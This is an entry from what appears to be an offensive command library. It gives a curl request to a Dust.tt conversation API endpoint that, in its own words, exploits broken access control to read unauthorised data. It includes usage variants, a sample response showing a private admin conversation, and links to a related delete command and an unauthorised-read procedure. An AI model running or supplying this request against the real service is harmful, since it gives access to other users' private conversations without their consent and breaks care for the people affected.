---
id: cmd-curl-dust-read-001
data: >-
  curl -X GET
  "https://dust.tt/api/w/mRHt1cXVmK/assistant/conversations/conv_abc123" -H
  "Authorization: Bearer YOUR_SESSION_TOKEN" -H "Content-Type: application/json"
tags:
  - api
  - read
  - dust-tt
type: command
output: >-
  {"conversation": {"id": 123, "created": 1696118400000, "sId": "conv_abc123",
  "owner": {"id": 456, "name": "Admin User"}, "title": "Private Admin Chat",
  "visibility": "private", "requestedGroupIds": [] }}
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:26.881Z'
verified: false
validated: true
submitted: true
---
# curl-dust-read-conversation

## Command

```bash
curl -X GET "https://dust.tt/api/w/mRHt1cXVmK/assistant/conversations/conv_abc123" -H "Authorization: Bearer YOUR_SESSION_TOKEN" -H "Content-Type: application/json"
```

## Description

This curl command sends a GET request to the Dust.tt API to retrieve details of a specified conversation, exploiting broken access control to read unauthorized data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method | Yes |
| `URL` | Full endpoint with workspace and conversation IDs | Yes |
| `-H "Authorization: Bearer TOKEN"` | Session token for authentication | Yes |
| `-H "Content-Type: application/json"` | Sets request header for JSON | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://dust.tt/api/w/mRHt1cXVmK/assistant/conversations/conv_abc123" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." -H "Content-Type: application/json"
```

### Advanced Usage

Add `-v` for verbose output to debug headers:

```bash
curl -v -X GET "https://dust.tt/api/w/mRHt1cXVmK/assistant/conversations/conv_abc123" -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json"
```

## Expected Output

JSON object containing conversation details, including ID, owner, title, visibility, and messages if successful (HTTP 200).

## Related

- [[commands/curl-dust-delete-conversation]]
- [[procedures/Read-Unauthorized-Conversation]]
